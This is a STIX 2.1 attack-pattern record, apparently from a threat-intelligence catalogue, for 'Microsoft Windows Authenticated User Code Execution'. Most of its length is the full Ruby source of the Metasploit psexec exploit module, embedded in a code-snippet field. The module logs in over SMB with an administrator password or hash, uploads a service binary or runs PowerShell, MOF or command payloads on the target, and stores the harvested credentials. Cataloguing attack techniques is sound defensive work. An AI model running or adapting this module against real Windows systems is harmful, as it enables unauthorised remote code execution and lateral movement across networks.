{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--36b4117e-0280-4be3-9e38-1d679e1e8531",
    "created": "2024-08-14T16:56:17.002423Z",
    "modified": "2024-08-14T16:56:17.002427Z",
    "name": "Microsoft Windows Authenticated User Code Execution",
    "description": " This module uses a valid administrator username and password (or password hash) to execute an arbitrary payload. This module is similar to the \"psexec\" utility provided by SysInternals. This module is now able to clean up after itself. The service created by this tool uses a randomly chosen name and description. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/smb/psexec.rb",
            "external_id": "psexec.rb"
        },
        {
            "source_name": "reference",
            "url": "http://technet.microsoft.com/en-us/sysinternals/bb897553.aspx"
        },
        {
            "source_name": "reference",
            "url": "https://www.optiv.com/blog/owning-computers-without-shell-access"
        },
        {
            "source_name": "reference",
            "url": "http://sourceforge.net/projects/smbexec/"
        },
        {
            "source_name": "#FortheCVE",
            "external_id": "PsExecwasfirstreleasedaroundFebruaryorMarch2001"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n# Windows XP systems that are not part of a domain default to treating all\n# network logons as if they were Guest. This prevents SMB relay attacks from\n# gaining administrative access to these systems. This setting can be found\n# under:\n#\n#  Local Security Settings >\n#   Local Policies >\n#    Security Options >\n#     Network Access: Sharing and security model for local accounts\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ManualRanking\n\n  include Msf::Exploit::Remote::SMB::Client::Psexec\n  include Msf::Exploit::Powershell\n  include Msf::Exploit::EXE\n  include Msf::Exploit::WbemExec\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Microsoft Windows Authenticated User Code Execution',\n      'Description'    => %q{\n          This module uses a valid administrator username and password (or\n        password hash) to execute an arbitrary payload. This module is similar\n        to the \"psexec\" utility provided by SysInternals. This module is now able\n        to clean up after itself. The service created by this tool uses a randomly\n        chosen name and description.\n      },\n      'Author'         =>\n        [\n          'hdm',\n          'Royce Davis <rdavis[at]accuvant.com>', # (@R3dy__) PSExec command module\n          'RageLtMan <rageltman[at]sempervictus>' # PSH exploit, libs, encoders\n        ],\n      'License'        => MSF_LICENSE,\n      'Privileged'     => true,\n      'DefaultOptions' =>\n        {\n          'WfsDelay'     => 10,\n          'EXITFUNC' => 'thread'\n        },\n      'References'     =>\n        [\n          [ 'CVE', '1999-0504'], # Administrator with no password (since this is the default)\n          [ 'OSVDB', '3106'],\n          [ 'URL', 'http://technet.microsoft.com/en-us/sysinternals/bb897553.aspx' ],\n          [ 'URL', 'https://www.optiv.com/blog/owning-computers-without-shell-access' ],\n          [ 'URL', 'http://sourceforge.net/projects/smbexec/' ]\n        ],\n      'Payload'        =>\n        {\n          'Space'        => 3072,\n          'DisableNops'  => true\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Automatic', { 'Arch' => [ARCH_X86, ARCH_X64] } ],\n          [ 'PowerShell', { 'Arch' => [ARCH_X86, ARCH_X64] } ],\n          [ 'Native upload', { 'Arch' => [ARCH_X86, ARCH_X64] } ],\n          [ 'MOF upload', { 'Arch' => [ARCH_X86, ARCH_X64] } ],\n          [ 'Command', { 'Arch' => [ARCH_CMD], 'Payload' => { 'Space' => 8191 } } ]\n        ],\n      'DefaultTarget'  => 0,\n      # For the CVE, PsExec was first released around February or March 2001\n      'DisclosureDate' => '1999-01-01'\n    ))\n\n    register_options(\n      [\n        OptString.new('SMBSHARE', [false, \"The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share\", ''], aliases: ['SHARE'])\n      ])\n\n    register_advanced_options(\n      [\n        OptBool.new('ALLOW_GUEST', [true, 'Keep trying if only given guest access', false]),\n        OptString.new('SERVICE_FILENAME', [false, 'Filename to to be used on target for the service binary', nil]),\n        OptString.new('PSH_PATH', [false, 'Path to powershell.exe', 'Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe']),\n        OptString.new('SERVICE_STUB_ENCODER', [false, 'Encoder to use around the service registering stub', nil])\n      ])\n  end\n\n  def native_upload_with_workaround(smbshare)\n    service_filename = datastore['SERVICE_FILENAME'] || \"#{rand_text_alpha(8)}.exe\"\n    service_encoder = datastore['SERVICE_STUB_ENCODER'] || ''\n\n    # Avoid implementing NTLMSSP on Windows XP\n    # https://seclists.org/metasploit/2009/q1/6\n    if smb_peer_os == \"Windows 5.1\"\n      connect(versions: [1])\n      smb_login\n    end\n    native_upload(smbshare, service_filename, service_encoder)\n  end\n\n  def validate_service_stub_encoder!\n    service_encoder = datastore['SERVICE_STUB_ENCODER']\n    return if service_encoder.nil? || service_encoder.empty?\n\n    encoder = framework.encoders[service_encoder]\n    if encoder.nil?\n      raise Msf::OptionValidateError.new(\n        {\n          'SERVICE_STUB_ENCODER' => \"Failed to find encoder #{service_encoder.inspect}\"\n        }\n      )\n    end\n  end\n\n  def exploit\n    validate_service_stub_encoder!\n\n    # automatically select an SMB share unless one is explicitly specified\n    if datastore['SMBSHARE'] && !datastore['SMBSHARE'].blank?\n      smbshare = datastore['SMBSHARE']\n    elsif target.name == 'Command'\n      smbshare = 'C$'\n    else\n      smbshare = 'ADMIN$'\n    end\n\n    print_status(\"Connecting to the server...\")\n    connect\n\n    print_status(\"Authenticating to #{smbhost} as user '#{splitname(datastore['SMBUser'])}'...\")\n    smb_login\n\n    if not simple.client.auth_user and not datastore['ALLOW_GUEST']\n      print_line(\" \")\n      print_error(\n        \"FAILED! The remote host has only provided us with Guest privileges. \" +\n        \"Please make sure that the correct username and password have been provided. \" +\n        \"Windows XP systems that are not part of a domain will only provide Guest privileges \" +\n        \"to network logins by default.\"\n      )\n      print_line(\" \")\n      disconnect\n      return\n    end\n\n    if datastore['SMBUser'].to_s.strip.length > 0\n      report_auth\n    end\n\n    case target.name\n    when 'Automatic'\n      if powershell_installed?(smbshare, datastore['PSH_PATH'])\n        print_status('Selecting PowerShell target')\n        execute_powershell_payload\n      else\n        print_status('Selecting native target')\n        native_upload_with_workaround(smbshare)\n      end\n    when 'PowerShell'\n      execute_powershell_payload\n    when 'Native upload'\n      native_upload_with_workaround(smbshare)\n    when 'MOF upload'\n      mof_upload(smbshare)\n    when 'Command'\n      execute_command_payload(smbshare)\n    end\n\n    handler\n    disconnect\n  end\n\n  def report_auth\n    service_data = {\n        address: ::Rex::Socket.getaddress(datastore['RHOST'],true),\n        port: datastore['RPORT'],\n        service_name: 'smb',\n        protocol: 'tcp',\n        workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n        origin_type: :service,\n        module_fullname: self.fullname,\n        private_data: datastore['SMBPass'],\n        username: datastore['SMBUser'].downcase\n    }\n\n    if datastore['SMBDomain'] and datastore['SMBDomain'] != 'WORKGROUP'\n      credential_data.merge!({\n        realm_key: Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN,\n        realm_value: datastore['SMBDomain']\n       })\n    end\n\n    if datastore['SMBPass'] =~ /[0-9a-fA-F]{32}:[0-9a-fA-F]{32}/\n      credential_data.merge!({:private_type => :ntlm_hash})\n    else\n      credential_data.merge!({:private_type => :password})\n    end\n\n    credential_data.merge!(service_data)\n\n    credential_core = create_credential(credential_data)\n\n    login_data = {\n        access_level: 'Admin',\n        core: credential_core,\n        last_attempted_at: DateTime.now,\n        status: Metasploit::Model::Login::Status::SUCCESSFUL\n    }\n\n    login_data.merge!(service_data)\n    create_credential_login(login_data)\n  end\nend\n",
    "x_mitre_disclosure_date": "1999-01-01",
    "x_mitre_platforms": [
        "win'"
    ]
}